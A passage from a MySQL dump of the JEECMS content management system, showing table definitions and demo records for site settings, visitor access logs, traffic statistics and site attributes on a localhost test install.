  `short_name` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '简短名称',
  `protocol` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT 'http://' COMMENT '协议',
  `dynamic_suffix` varchar(10) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '.jhtml' COMMENT '动态页后缀',
  `static_suffix` varchar(10) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '.html' COMMENT '静态页后缀',
  `static_dir` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '静态页存放目录',
  `is_index_to_root` char(1) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '0' COMMENT '是否使用将首页放在根目录下',
  `is_static_index` char(1) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '0' COMMENT '是否静态化首页',
  `locale_admin` varchar(10) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT 'zh_CN' COMMENT '后台本地化',
  `locale_front` varchar(10) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT 'zh_CN' COMMENT '前台本地化',
  `tpl_solution` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT 'default' COMMENT '模板方案',
  `final_step` tinyint(4) NOT NULL DEFAULT 2 COMMENT '终审级别',
  `after_check` tinyint(4) NOT NULL DEFAULT 2 COMMENT '审核后(1:不能修改删除;2:修改后退回;3:修改后不变)',
  `is_relative_path` char(1) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '1' COMMENT '是否使用相对路径',
  `is_recycle_on` char(1) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '1' COMMENT '是否开启回收站',
  `domain_alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '域名别名',
  `domain_redirect` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '域名重定向',
  `tpl_index` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '首页模板',
  `keywords` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '站点关键字',
  `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '站点描述',
  `tpl_mobile_solution` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT 'mobile' COMMENT '手机站模板方案',
  `mobile_static_dir` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT '/wap' COMMENT '手机站静态页存放目录',
  `mobile_static_sync` tinyint(1) NOT NULL DEFAULT 0 COMMENT '手机站静态页同步生成',
  `ftp_sync_page_id` int(11) NULL DEFAULT NULL COMMENT '静态页同步FTP',
  `page_is_sync_ftp` tinyint(1) NOT NULL DEFAULT 0 COMMENT '静态页同步发布FTP',
  `resouce_is_sync_ftp` tinyint(1) NOT NULL DEFAULT 0 COMMENT '资源同步发布FTP',
  `oss_id` int(11) NULL DEFAULT NULL COMMENT '图片附件云存储oss',
  PRIMARY KEY (`site_id`) USING BTREE,
  UNIQUE INDEX `ak_domain_path`(`domain`) USING BTREE,
  INDEX `fk_jc_site_config`(`config_id`) USING BTREE,
  INDEX `fk_jc_site_upload_ftp`(`ftp_upload_id`) USING BTREE,
  CONSTRAINT `fk_jc_site_config` FOREIGN KEY (`config_id`) REFERENCES `jc_config` (`config_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_site_upload_ftp` FOREIGN KEY (`ftp_upload_id`) REFERENCES `jo_ftp` (`ftp_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS站点表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_site
-- ----------------------------
INSERT INTO `jc_site` VALUES (1, 1, NULL, '127.0.0.1', 'www', '门户网站demo', '门户网站demo', 'http://', '.jhtml', '.html', '/html', '0', '0', 'zh_CN', 'zh_CN', 'default', 3, 3, '0', '1', '', '90', '', 'JEECMS－JAVA网站内容管理系统|开源java cms系统,jsp cms网站管理', 'JEECMS-国内优秀的JAVA(JSP)网站内容管理系统', 'mobile', '/wap', 0, NULL, 0, 0, NULL);

-- ----------------------------
-- Table structure for jc_site_access
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_access`;
CREATE TABLE `jc_site_access`  (
  `access_id` int(11) NOT NULL AUTO_INCREMENT,
  `session_id` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `site_id` int(11) NOT NULL COMMENT '站点id',
  `access_time` time NOT NULL COMMENT '访问时间',
  `access_date` date NOT NULL COMMENT '访问日期',
  `ip` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `area` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '访问地区',
  `access_source` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '访问来源',
  `external_link` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '外部链接网址',
  `engine` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '搜索引擎',
  `entry_page` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '入口页面',
  `last_stop_page` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '最后停留页面',
  `visit_second` int(11) NULL DEFAULT NULL COMMENT '访问时长(秒)',
  `visit_page_count` int(11) NULL DEFAULT NULL COMMENT '访问页面数',
  `operating_system` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '操作系统',
  `browser` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '浏览器',
  `keyword` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '来访关键字',
  PRIMARY KEY (`access_id`) USING BTREE,
  INDEX `fk_jc_access_site`(`site_id`) USING BTREE,
  CONSTRAINT `fk_jc_access_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 53 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '站点访问表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_site_access
-- ----------------------------
INSERT INTO `jc_site_access` VALUES (51, '5E6DA42AD7EC72A17D6B6EB37705357B', 1, '10:03:34', '2019-01-29', '127.0.0.1', '', '外部链接', 'http://127.0.0.1:8082', NULL, 'http://127.0.0.1:8082/menhu/search.jspx?q=%E7%BE%8E%E5%A5%B3&token=789957f6-990f-4c7e-8d92-58a5007aa561', 'http://127.0.0.1:8082/menhu/news/index.jhtml', 29, 3, 'WinNT', 'chrome 71', '');
INSERT INTO `jc_site_access` VALUES (52, '37130844BB0829EE03C091EF36ECFD58', 1, '10:03:12', '2019-01-29', '127.0.0.1', '', '直接访问', NULL, NULL, 'http://localhost:8082/menhu/', 'http://localhost:8082/menhu/', -1548720000, 3, 'WinNT', 'chrome 71', '');

-- ----------------------------
-- Table structure for jc_site_access_count
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_access_count`;
CREATE TABLE `jc_site_access_count`  (
  `access_count` int(11) NOT NULL AUTO_INCREMENT,
  `page_count` int(11) NOT NULL DEFAULT 1 COMMENT '访问页数',
  `visitors` int(11) NOT NULL DEFAULT 0 COMMENT '用户数',
  `statistic_date` date NOT NULL COMMENT '统计日期',
  `site_id` int(11) NOT NULL COMMENT '统计站点',
  PRIMARY KEY (`access_count`) USING BTREE,
  INDEX `fk_jc_access_count_site`(`site_id`) USING BTREE,
  CONSTRAINT `fk_jc_access_count_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 34 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '每日统计页数访问情况' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_site_access_count
-- ----------------------------
INSERT INTO `jc_site_access_count` VALUES (1, 1, 1, '2018-11-26', 1);
INSERT INTO `jc_site_access_count` VALUES (2, 24, 1, '2018-11-30', 1);
INSERT INTO `jc_site_access_count` VALUES (3, 59, 1, '2018-11-30', 1);
INSERT INTO `jc_site_access_count` VALUES (4, 82, 1, '2018-11-30', 1);
INSERT INTO `jc_site_access_count` VALUES (5, 1, 2, '2018-12-03', 1);
INSERT INTO `jc_site_access_count` VALUES (6, 2, 1, '2018-12-03', 1);
INSERT INTO `jc_site_access_count` VALUES (7, 2, 1, '2018-12-04', 1);
INSERT INTO `jc_site_access_count` VALUES (8, 3, 1, '2018-12-04', 1);
INSERT INTO `jc_site_access_count` VALUES (9, 1, 1, '2018-12-10', 1);
INSERT INTO `jc_site_access_count` VALUES (10, 1, 1, '2018-12-11', 1);
INSERT INTO `jc_site_access_count` VALUES (11, 1, 1, '2018-12-26', 1);
INSERT INTO `jc_site_access_count` VALUES (12, 1, 6, '2019-01-02', 1);
INSERT INTO `jc_site_access_count` VALUES (13, 1, 2, '2019-01-03', 1);
INSERT INTO `jc_site_access_count` VALUES (14, 2, 1, '2019-01-03', 1);
INSERT INTO `jc_site_access_count` VALUES (15, 1, 19, '2019-01-04', 1);
INSERT INTO `jc_site_access_count` VALUES (16, 1, 2, '2019-01-07', 1);
INSERT INTO `jc_site_access_count` VALUES (17, 1, 1, '2019-01-08', 1);
INSERT INTO `jc_site_access_count` VALUES (18, 2, 1, '2019-01-10', 1);
INSERT INTO `jc_site_access_count` VALUES (19, 1, 14, '2019-01-11', 1);
INSERT INTO `jc_site_access_count` VALUES (20, 2, 1, '2019-01-11', 1);
INSERT INTO `jc_site_access_count` VALUES (21, 1, 3, '2019-01-13', 1);
INSERT INTO `jc_site_access_count` VALUES (22, 1, 17, '2019-01-14', 1);
INSERT INTO `jc_site_access_count` VALUES (23, 1, 1, '2019-01-15', 1);
INSERT INTO `jc_site_access_count` VALUES (24, 1, 1, '2019-01-17', 1);
INSERT INTO `jc_site_access_count` VALUES (25, 1, 1, '2019-01-18', 1);
INSERT INTO `jc_site_access_count` VALUES (26, 1, 4, '2019-01-23', 1);
INSERT INTO `jc_site_access_count` VALUES (27, 2, 1, '2019-01-23', 1);
INSERT INTO `jc_site_access_count` VALUES (28, 5, 1, '2019-01-25', 1);
INSERT INTO `jc_site_access_count` VALUES (29, 16, 1, '2019-01-25', 1);
INSERT INTO `jc_site_access_count` VALUES (30, 20, 1, '2019-01-25', 1);
INSERT INTO `jc_site_access_count` VALUES (31, 26, 1, '2019-01-25', 1);
INSERT INTO `jc_site_access_count` VALUES (32, 9, 1, '2019-01-28', 1);
INSERT INTO `jc_site_access_count` VALUES (33, 48, 1, '2019-01-28', 1);

-- ----------------------------
-- Table structure for jc_site_access_count_hour
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_access_count_hour`;
CREATE TABLE `jc_site_access_count_hour`  (
  `access_count_hour_id` int(11) NOT NULL AUTO_INCREMENT,
  `hour_pv` int(11) NOT NULL DEFAULT 0 COMMENT '小时PV',
  `hour_ip` int(11) NOT NULL DEFAULT 0 COMMENT '小时IP',
  `hour_uv` int(11) NOT NULL DEFAULT 0 COMMENT '小时访客数',
  `access_date` date NOT NULL,
  `access_hour` int(2) NOT NULL DEFAULT 0,
  `site_id` int(11) NOT NULL DEFAULT 0 COMMENT '站点ID',
  PRIMARY KEY (`access_count_hour_id`) USING BTREE,
  INDEX `index_jc_access_count_hour`(`access_hour`) USING BTREE,
  INDEX `index_jc_access_count_hour_date`(`access_date`) USING BTREE,
  INDEX `index_jc_access_count_hour_site`(`site_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 50 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '小时数据统计' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_site_access_count_hour
-- ----------------------------
INSERT INTO `jc_site_access_count_hour` VALUES (1, 1, 1, 1, '2018-11-26', 17, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (2, 59, 1, 1, '2018-11-30', 10, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (3, 24, 1, 1, '2018-11-30', 13, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (4, 82, 1, 1, '2018-11-30', 14, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (5, 1, 1, 1, '2018-12-03', 15, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (6, 2, 1, 1, '2018-12-03', 16, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (7, 1, 1, 1, '2018-12-03', 17, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (8, 3, 1, 1, '2018-12-04', 11, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (9, 2, 1, 1, '2018-12-04', 12, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (10, 1, 1, 1, '2018-12-10', 16, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (11, 1, 1, 1, '2018-12-11', 9, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (12, 1, 1, 1, '2018-12-26', 9, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (13, 1, 1, 1, '2019-01-02', 9, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (14, 4, 1, 4, '2019-01-02', 15, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (15, 1, 1, 1, '2019-01-02', 17, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (16, 2, 1, 2, '2019-01-03', 16, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (17, 2, 1, 1, '2019-01-03', 17, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (18, 13, 1, 13, '2019-01-04', 10, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (19, 5, 1, 5, '2019-01-04', 11, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (20, 1, 1, 1, '2019-01-04', 17, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (21, 1, 1, 1, '2019-01-07', 13, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (22, 1, 1, 1, '2019-01-07', 16, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (23, 1, 1, 1, '2019-01-08', 14, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (24, 2, 1, 1, '2019-01-10', 11, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (25, 1, 1, 1, '2019-01-11', 10, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (26, 4, 1, 4, '2019-01-11', 11, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (27, 1, 1, 1, '2019-01-11', 13, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (28, 5, 1, 4, '2019-01-11', 14, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (29, 3, 1, 3, '2019-01-11', 15, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (30, 2, 1, 2, '2019-01-11', 16, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (31, 3, 1, 3, '2019-01-13', 18, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (32, 1, 1, 1, '2019-01-14', 9, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (33, 1, 1, 1, '2019-01-14', 10, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (34, 2, 1, 2, '2019-01-14', 11, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (35, 1, 1, 1, '2019-01-14', 13, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (36, 2, 1, 2, '2019-01-14', 14, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (37, 1, 1, 1, '2019-01-14', 15, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (38, 8, 1, 8, '2019-01-14', 16, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (39, 1, 1, 1, '2019-01-14', 17, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (40, 1, 1, 1, '2019-01-15', 15, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (41, 1, 1, 1, '2019-01-17', 9, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (42, 1, 1, 1, '2019-01-18', 16, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (43, 1, 1, 1, '2019-01-23', 10, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (44, 5, 1, 4, '2019-01-23', 14, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (45, 26, 1, 1, '2019-01-25', 15, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (46, 5, 1, 1, '2019-01-25', 16, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (47, 36, 1, 2, '2019-01-25', 17, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (48, 48, 1, 1, '2019-01-28', 16, 1);
INSERT INTO `jc_site_access_count_hour` VALUES (49, 9, 1, 1, '2019-01-28', 17, 1);

-- ----------------------------
-- Table structure for jc_site_access_pages
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_access_pages`;
CREATE TABLE `jc_site_access_pages`  (
  `access_pages_id` int(11) NOT NULL AUTO_INCREMENT,
  `access_page` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '访问页面',
  `session_id` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `access_date` date NOT NULL DEFAULT '0000-00-00' COMMENT '访问日期',
  `access_time` time NOT NULL COMMENT '访问时间',
  `visit_second` int(11) NOT NULL DEFAULT 0 COMMENT '停留时长（秒）',
  `page_index` int(11) NOT NULL DEFAULT 0 COMMENT '用户访问页面的索引',
  `site_id` int(11) NOT NULL DEFAULT 1,
  PRIMARY KEY (`access_pages_id`) USING BTREE,
  INDEX `fk_jc_access_pages_access`(`session_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 67 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '访问详细页面表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_site_access_pages
-- ----------------------------
INSERT INTO `jc_site_access_pages` VALUES (62, 'http://127.0.0.1:8082/menhu/news/49.jhtml', 'C4617BC396DC36FF54019509E26D0299', '2019-01-29', '09:49:38', 1, 9, 1);
INSERT INTO `jc_site_access_pages` VALUES (63, 'http://127.0.0.1:8082/menhu/search.jspx?q=%E7%BE%8E%E5%A5%B3&token=789957f6-990f-4c7e-8d92-58a5007aa561', '5E6DA42AD7EC72A17D6B6EB37705357B', '2019-01-29', '10:03:55', 4, 1, 1);
INSERT INTO `jc_site_access_pages` VALUES (64, 'http://127.0.0.1:8082/menhu/search.jspx?q=%E7%BE%8E%E5%A5%B3&token=789957f6-990f-4c7e-8d92-58a5007aa561', '5E6DA42AD7EC72A17D6B6EB37705357B', '2019-01-29', '10:03:43', 0, 3, 1);
INSERT INTO `jc_site_access_pages` VALUES (65, 'http://localhost:8082/menhu/', '37130844BB0829EE03C091EF36ECFD58', '2019-01-29', '10:03:33', 0, 3, 1);
INSERT INTO `jc_site_access_pages` VALUES (66, 'http://127.0.0.1:8082/menhu/video/53.jhtml', '5E6DA42AD7EC72A17D6B6EB37705357B', '2019-01-29', '10:03:59', 0, 2, 1);

-- ----------------------------
-- Table structure for jc_site_access_statistic
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_access_statistic`;
CREATE TABLE `jc_site_access_statistic`  (
  `access_statistic_id` int(11) NOT NULL AUTO_INCREMENT,
  `statistic_date` date NOT NULL COMMENT '统计日期',
  `pv` int(11) NOT NULL DEFAULT 0 COMMENT 'pv量',
  `ip` int(11) NOT NULL DEFAULT 0 COMMENT 'ip量',
  `visitors` int(11) NOT NULL DEFAULT 0 COMMENT '访客数量',
  `pages_aver` int(11) NOT NULL DEFAULT 0 COMMENT '人均浏览次数',
  `visit_second_aver` int(11) NOT NULL DEFAULT 0 COMMENT '人均访问时长（秒）',
  `site_id` int(11) NOT NULL COMMENT '站点id',
  `statisitc_type` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT 'all' COMMENT '统计分类（all代表当天所有访问量的统计）',
  `statistic_column_value` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT '' COMMENT '统计列值',
  PRIMARY KEY (`access_statistic_id`) USING BTREE,
  INDEX `fk_jc_access_statistic_site`(`site_id`) USING BTREE,
  CONSTRAINT `fk_jc_access_statistic_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 50 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '访问统计表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_site_access_statistic
-- ----------------------------
INSERT INTO `jc_site_access_statistic` VALUES (1, '2018-11-26', 1, 1, 1, 1, 0, 1, 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES (2, '2018-11-26', 1, 1, 1, 1, 0, 1, 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES (3, '2018-11-30', 165, 1, 3, 55, 4420, 1, 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES (4, '2018-11-30', 106, 1, 2, 53, 4524, 1, 'source', '外部链接');
INSERT INTO `jc_site_access_statistic` VALUES (5, '2018-11-30', 59, 1, 1, 59, 4214, 1, 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES (6, '2018-11-30', 106, 1, 2, 53, 4524, 1, 'link', 'http://127.0.0.1:8080');
INSERT INTO `jc_site_access_statistic` VALUES (7, '2018-12-03', 4, 1, 3, 1, 116, 1, 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES (8, '2018-12-03', 4, 1, 3, 1, 116, 1, 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES (9, '2018-12-04', 5, 1, 2, 2, -771940354, 1, 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES (10, '2018-12-04', 5, 1, 2, 2, -771940354, 1, 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES (11, '2018-12-10', 1, 1, 1, 1, 0, 1, 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES (12, '2018-12-10', 1, 1, 1, 1, 0, 1, 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES (13, '2018-12-11', 1, 1, 1, 1, 0, 1, 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES (14, '2018-12-11', 1, 1, 1, 1, 0, 1, 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES (15, '2018-12-26', 1, 1, 1, 1, 0, 1, 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES (16, '2018-12-26', 1, 1, 1, 1, 0, 1, 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES (17, '2019-01-02', 6, 1, 6, 1, 0, 1, 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES (18, '2019-01-02', 6, 1, 6, 1, 0, 1, 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES (19, '2019-01-03', 4, 1, 3, 1, -515491192, 1, 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES (20, '2019-01-03', 4, 1, 3, 1, -515491192, 1, 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES (21, '2019-01-04', 19, 1, 19, 1, 0, 1, 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES (22, '2019-01-04', 19, 1, 19, 1, 0, 1, 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES (23, '2019-01-07', 2, 1, 2, 1, 0, 1, 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES (24, '2019-01-07', 2, 1, 2, 1, 0, 1, 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES (25, '2019-01-08', 1, 1, 1, 1, 0, 1, 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES (26, '2019-01-08', 1, 1, 1, 1, 0, 1, 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES (27, '2019-01-10', 2, 1, 1, 2, -1547078367, 1, 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES (28, '2019-01-10', 2, 1, 1, 2, -1547078367, 1, 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES (29, '2019-01-11', 16, 1, 15, 1, -103144316, 1, 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES (30, '2019-01-11', 16, 1, 15, 1, -103144316, 1, 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES (31, '2019-01-13', 3, 1, 3, 1, 0, 1, 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES (32, '2019-01-13', 3, 1, 3, 1, 0, 1, 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES (33, '2019-01-14', 17, 1, 17, 1, 0, 1, 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES (34, '2019-01-14', 17, 1, 17, 1, 0, 1, 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES (35, '2019-01-15', 1, 1, 1, 1, 0, 1, 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES (36, '2019-01-15', 1, 1, 1, 1, 0, 1, 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES (37, '2019-01-17', 1, 1, 1, 1, 0, 1, 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES (38, '2019-01-17', 1, 1, 1, 1, 0, 1, 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES (39, '2019-01-18', 1, 1, 1, 1, 0, 1, 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES (40, '2019-01-18', 1, 1, 1, 1, 0, 1, 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES (41, '2019-01-23', 6, 1, 5, 1, -309640320, 1, 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES (42, '2019-01-23', 6, 1, 5, 1, -309640320, 1, 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES (43, '2019-01-25', 67, 1, 4, 16, 1149, 1, 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES (44, '2019-01-25', 67, 1, 4, 16, 1149, 1, 'source', '外部链接');
INSERT INTO `jc_site_access_statistic` VALUES (45, '2019-01-25', 47, 1, 3, 15, 1334, 1, 'link', 'http://127.0.0.1:8080');
INSERT INTO `jc_site_access_statistic` VALUES (46, '2019-01-25', 20, 1, 1, 20, 594, 1, 'link', 'http://localhost:8080');
INSERT INTO `jc_site_access_statistic` VALUES (47, '2019-01-28', 57, 1, 2, 28, -774316471, 1, 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES (48, '2019-01-28', 57, 1, 2, 28, -774316471, 1, 'source', '外部链接');
INSERT INTO `jc_site_access_statistic` VALUES (49, '2019-01-28', 57, 1, 2, 28, -774316471, 1, 'link', 'http://127.0.0.1:8082');

-- ----------------------------
-- Table structure for jc_site_attr
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_attr`;
CREATE TABLE `jc_site_attr`  (
  `site_id` int(11) NOT NULL,
  `attr_name` varchar(30) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '名称',
  `attr_value` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '值',
  INDEX `fk_jc_attr_site`(`site_id`) USING BTREE,
  CONSTRAINT `fk_jc_attr_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS站点属性表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_site_attr
-- ----------------------------
INSERT INTO `jc_site_attr` VALUES (1, 'pvTotal', '7360');
INSERT INTO `jc_site_attr` VALUES (1, 'visitors', '5014');
INSERT INTO `jc_site_attr` VALUES (1, 'wxAppkey', '111111');
INSERT INTO `jc_site_attr` VALUES (1, 'wxAppSecret', '111111');
INSERT INTO `jc_site_attr` VALUES (1, 'dayPvTotal', '9');
INSERT INTO `jc_site_attr` VALUES (1, 'dayVisitors', '6');
INSERT INTO `jc_site_attr` VALUES (1, 'weekPvTotal', '73');
INSERT INTO `jc_site_attr` VALUES (1, 'monthPvTotal', '110');
INSERT INTO `jc_site_attr` VALUES (1, 'monthVisitors', '28');
INSERT INTO `jc_site_attr` VALUES (1, 'weekVisitors', '15');
INSERT INTO `jc_site_attr` VALUES (1, 'wxToken', 'myjcywangluoweixin');
INSERT INTO `jc_site_attr` VALUES (1, 'contentTotal', '12');
INSERT INTO `jc_site_attr` VALUES (1, 'commentTotal', '0');
INSERT INTO `jc_site_attr` VALUES (1, 'guestbookTotal', '4');
INSERT INTO `jc_site_attr` VALUES (1, 'memberTotal', '1');

-- ----------------------------
-- Table structure for jc_site_cfg
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_cfg`;
CREATE TABLE `jc_site_cfg`  (
  `site_id` int(11) NOT NULL,
  `cfg_name` varchar(30) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '名称',
  `cfg_value` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '值',
  INDEX `fk_jc_cfg_site`(`site_id`) USING BTREE,
